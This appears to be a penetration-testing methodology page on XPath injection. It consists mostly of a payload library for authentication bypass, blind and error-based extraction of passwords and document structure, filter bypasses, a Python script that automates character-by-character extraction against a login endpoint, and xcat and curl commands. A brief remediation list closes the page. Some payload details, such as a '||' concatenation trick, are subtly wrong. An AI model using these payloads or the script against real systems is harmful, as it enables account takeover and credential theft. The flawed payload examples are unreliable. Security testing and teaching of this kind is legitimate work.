---
title: "XPath Injection"
date: 2026-02-24
draft: false
---

# XPath Injection

> **Severity**: High | **CWE**: CWE-91
> **OWASP**: A03:2021 – Injection

---

## What Is XPath Injection?

XPath is a query language for navigating XML documents. Applications that use XPath to query XML-backed datastores (config files, LDAP over XML, XML databases, SAML assertions) are vulnerable when user input is concatenated directly into XPath expressions.

Unlike SQL, **XPath has no native parameterization** in most implementations — making injection structurally similar to classic SQLi but with XPath operators and axes.

```
Vulnerable pattern (PHP):
  $query = "//user[name/text()='" . $username . "' and password/text()='" . $password . "']";
  $result = $xml->xpath($query);

Injected username: admin' or '1'='1
  Query: //user[name/text()='admin' or '1'='1' and password/text()='x']
  → Returns all users matching 'admin' OR where '1'='1' is always true
```

XPath 1.0 (most common) has no out-of-band exfiltration — exploitation is **error-based or blind boolean**.

---

## Discovery Checklist

**Phase 1 — Identify XML/XPath Backends**
- [ ] Login forms on apps using XML-based user stores (content management, configuration-driven apps)
- [ ] Search fields that query XML product catalogs, configuration files, document repositories
- [ ] SAML assertion processing endpoints (XPath used to extract NameID, attributes)
- [ ] REST APIs that query XML-backed data with filter parameters
- [ ] SOAP/XML-RPC endpoints

**Phase 2 — Injection Testing**
- [ ] Inject single quote `'` → XPath error different from "invalid credentials" → injection point confirmed
- [ ] Inject `'` and `"` → compare error messages
- [ ] Inject `' or '1'='1` → if auth bypass → confirmed
- [ ] Inject `' or 1=1 or 'x'='` → alternative syntax
- [ ] Inject XPath operators: `and`, `or`, `not()`, `contains()`
- [ ] Test boolean: `' and '1'='1` (true) vs `' and '1'='2` (false)
- [ ] Inject XPath functions: `string()`, `normalize-space()`, `substring()`

**Phase 3 — Exploitation**
- [ ] Extract document structure using blind XPath
- [ ] Use `count()`, `string-length()`, `substring()` for char-by-char extraction
- [ ] Extract root element name, child nodes, attribute values

---

## Payload Library

### Payload 1 — Authentication Bypass

```
# Classic XPath auth bypass — single-quote injection:

# If query is: //users/user[username='USER' and password='PASS']

# Always-true username injection:
Username: ' or '1'='1
Password: anything
# Query: //users/user[username='' or '1'='1' and password='anything']
# → Evaluates: (username='') or ('1'='1' and password='anything')
# → If or takes precedence → first user returned → logged in as first user

# Full always-true bypass:
Username: ' or 1=1 or '
Password: x
# Query: //users/user[username='' or 1=1 or '' and password='x']

# Comment-style bypass (XPath has no comments — use string tricks):
Username: admin' or '1'='1' and name()='user
Password: x

# Match admin specifically:
Username: admin
Password: ' or '1'='1
# Query: //users/user[username='admin' and password='' or '1'='1']
# → If precedence: (username='admin' and password='') or ('1'='1') → always true

# Select any node:
Username: ' or count(/*)>0 or '
Password: x
```

### Payload 2 — Boolean-Based Blind Extraction

```
# Extract document structure and data char-by-char

# Determine root element name — does it start with 'u'?
Username: ' or substring(name(/*[1]),1,1)='u' or '1'='2
# True response = root starts with 'u'
# False response = doesn't

# Full root element name extraction (automate):
# position N, char at position:
' or substring(name(/*[1]),1,1)='a' or '1'='2  → check 'a'
' or substring(name(/*[1]),1,1)='b' or '1'='2  → check 'b'
...iterate until match

# Count child nodes of root:
' or count(/*[1]/*)=5 or '1'='2
' or count(/*[1]/*)>3 or '1'='2

# Get second child element name:
' or substring(name(/*[1]/*[2]),1,1)='p' or '1'='2

# Extract text content of node:
' or substring(/*[1]/*[1]/text(),1,1)='a' or '1'='2

# String-length based enumeration:
' or string-length(name(/*[1]))=5 or '1'='2
# → if 5 → root element name is 5 chars long

# Automate in Python:
python3 << 'PYEOF'
import requests, string

TARGET = "https://target.com/login"
CHARS = string.ascii_lowercase + string.digits + "_"

def check(expr):
    r = requests.post(TARGET, data={
        "username": f"' or {expr} or '1'='2",
        "password": "x"
    })
    return "Welcome" in r.text or r.status_code == 302

# Extract root element name:
root_name = ""
length = next(n for n in range(1, 30) if check(f"string-length(name(/*[1]))={n}"))
print(f"Root name length: {length}")
for i in range(1, length + 1):
    c = next(c for c in CHARS if check(f"substring(name(/*[1]),{i},1)='{c}'"))
    root_name += c
    print(f"Root: {root_name}")
PYEOF
```

### Payload 3 — Extract Passwords and Attributes

```
# Once you know structure: //users/user[username='X']/password

# Get admin's password length:
' or string-length(//user[username='admin']/password/text())>5 or '1'='2
' or string-length(//user[username='admin']/password/text())=12 or '1'='2

# Extract password char by char:
' or substring(//user[username='admin']/password/text(),1,1)='a' or '1'='2
' or substring(//user[username='admin']/password/text(),2,1)='d' or '1'='2

# Extract all usernames using position():
' or name(//user[2]/username)='username' or '1'='2  # confirm field name
' or //user[2]/username/text()='bob' or '1'='2       # check if second user is 'bob'

# Count total users:
' or count(//user)=5 or '1'='2

# Extract specific attribute value:
' or //user[@id='1']/@role='admin' or '1'='2

# Get node value using contains():
' or contains(//user[1]/password/text(),'pass') or '1'='2

# Extract using translate() for multiple chars at once:
' or translate(substring(//user[1]/password/text(),1,1),'abcdefghijklmnopqrstuvwxyz','abcdefghijklmnopqrstuvwxyz')='a' or '1'='2
```

### Payload 4 — Error-Based Extraction

```
# Some XPath implementations expose document content in error messages

# Force error with invalid XPath containing target data:
# If app shows XPath error details:

Username: invalid' and contains(string(//),'/') and 'x'='x
# → Error message may include portion of XML document

# Use concat() to include value in error:
' and count(concat(//user[1]/password,'')) > 0 and '1'='1

# XPath 2.0 / Saxon error-based (force type error):
' and (substring(//user[1]/password,1,1) castable as xs:integer) and '

# Errors that leak data (example error messages to look for):
# "Cannot convert 'admin123' to boolean"
# "XPath syntax error near 'actualpassword'"
# javax.xml.xpath.XPathExpressionException: admin123
```

### Payload 5 — XPath in Different Contexts

```bash
# SOAP/XML-RPC injection:
POST /soap/endpoint HTTP/1.1
Content-Type: text/xml

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <search>
      <username>' or '1'='1</username>
    </search>
  </soap:Body>
</soap:Envelope>

# XML filter parameter injection:
GET /api/users?filter=name='admin'%20or%20'1'='1 HTTP/1.1

# JSON wrapped XML:
POST /api/query HTTP/1.1
Content-Type: application/json
{"query": "//user[name=\"' or '1'='1\"]"}

# SAML XPath injection (in assertion processing):
# If app extracts NameID via XPath on SAML response
# and assertion XML is attacker-controlled:
# <saml:NameID>' or //user[1]/password/text()='hash' or 'x'='y</saml:NameID>
```

### Payload 6 — Bypass Filters

```
# Filter removes single quotes → use double quotes:
" or "1"="1
" or 1=1 or "x"="x

# Filter removes quotes entirely → use numeric comparison:
or 1=1
and count(/*)>0

# Filter removes 'or'/'and' (case-insensitive) → use XPath operators:
| (union in XPath 1.0 for node sets, not same as SQL UNION)

# Use normalize-space() to bypass space filter:
'or(1=1)or'x'='     # no spaces

# Hex encoding (some parsers):
&#x27; or &#x27;1&#x27;=&#x27;1    # HTML entity single quote

# URL encoding in GET params:
%27+or+%271%27%3D%271

# Filter blocks specific words → concat strings:
' or contains(name(.),con'||'cat(name(.),name(.))) or '
# (less useful, but demonstrates concat trick)
```

---

## Tools

```bash
# xcat — automated XPath injection tool:
pip3 install xcat
xcat run https://target.com/login username --true-string "Welcome" \
  --false-string "Invalid" -- username={} password=test

# xcat environment (XML structure exploration):
xcat run https://target.com/login username \
  --true-string "Welcome" \
  environment

# Manual blind extraction with Python (see Payload 2 script above)

# Burp Suite:
# Active Scan → detects XPath injection
# Intruder: inject XPath payloads from SecLists:
# /usr/share/seclists/Fuzzing/XPath-Injection.txt

# Detect XPath injection in responses:
# Look for: XPathException, javax.xml.xpath, XPATH, net.sf.saxon,
# org.jaxen, libxml, xpath syntax error

curl -s -X POST https://target.com/login \
  -d "username='&password=test" | grep -i "xpath\|xml\|syntax error"

# Fingerprint XPath implementation:
# JAXP (Java): javax.xml.xpath.XPathExpressionException
# Saxon: net.sf.saxon.xpath.XPathException
# libxml2: XPath error
# SimpleXML (PHP): Warning: SimpleXMLElement::xpath()

# Test boolean diff (automation base):
curl_login() {
  curl -s -X POST https://target.com/login \
    -d "username=$1&password=x"
}

TRUE_RESP=$(curl_login "admin' or '1'='1")
FALSE_RESP=$(curl_login "admin' and '1'='2")
echo "True length: ${#TRUE_RESP}, False length: ${#FALSE_RESP}"
# Significant difference → boolean injection works
```

---

## Remediation Reference

- **Parameterized XPath**: use XPath variables (`$var`) instead of string concatenation — supported in JAXP via `XPathVariableResolver`
- **Input allowlisting**: usernames/IDs should match `[a-zA-Z0-9_-]+` — reject single quotes, brackets, operators
- **Escape single quotes**: replace `'` with `&apos;` before inserting into XPath string literals — not sufficient alone
- **Schema validation**: validate XML structure before querying; reject malformed XML
- **Disable external entity processing** if the XML document is user-supplied (prevents XXE chaining)
- **Use an ORM or higher-level API**: avoid raw XPath construction; use typed query builders

*Part of the Web Application Penetration Testing Methodology series.*
